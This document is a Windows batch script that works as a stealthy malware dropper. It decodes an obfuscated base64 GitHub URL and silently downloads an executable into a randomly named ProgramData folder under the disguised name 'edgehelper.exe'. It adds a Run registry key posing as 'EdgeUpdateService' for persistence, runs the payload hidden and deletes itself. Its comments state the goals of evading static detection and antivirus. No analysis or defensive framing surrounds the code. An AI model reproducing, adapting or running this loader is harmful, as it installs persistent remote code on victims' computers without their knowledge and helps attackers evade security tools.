@echo off
setlocal EnableDelayedExpansion

:: Stealth folder with random name
set "p=%ProgramData%\Svc%random%"
mkdir "!p!" >nul 2>&1

:: Output EXE name
set "exe=edgehelper.exe"
set "full=!p!\!exe!"

:: Base64 decode the GitHub URL using PowerShell (avoids static URLs)
for /f "delims=" %%A in ('powershell -nop -ep bypass -c "[Text.Encoding]::UTF8.GetString([Convert]::FromBase64String('aHR0cHM6Ly9yYXcuZ2l0aHVidXNlcmNvbnRlbnQuY29tL0V2b2NhdGVkU3VwcG9ydC9SdW50aW1lQnJva2VyVjIvcmVmcy9oZWFkcy9tYWluL1J1bnRpbWVCcm9rZXJWMi5leGU='))"') do set "url=%%A"

:: Download using PowerShell silently
powershell -nop -w hidden -c "Invoke-WebRequest -Uri '!url!' -OutFile '!full!'" >nul 2>&1

:: Add to Startup registry for persistence (low AV detection method)
reg add "HKCU\Software\Microsoft\Windows\CurrentVersion\Run" /v "EdgeUpdateService" /t REG_SZ /d "!full!" /f >nul 2>&1

:: Execute the payload quietly
start "" "!full!" >nul 2>&1

:: Optional: Self-delete this script
set "me=%~f0"
timeout /t 2 >nul
del "!me!" >nul 2>&1

endlocal
exit /b
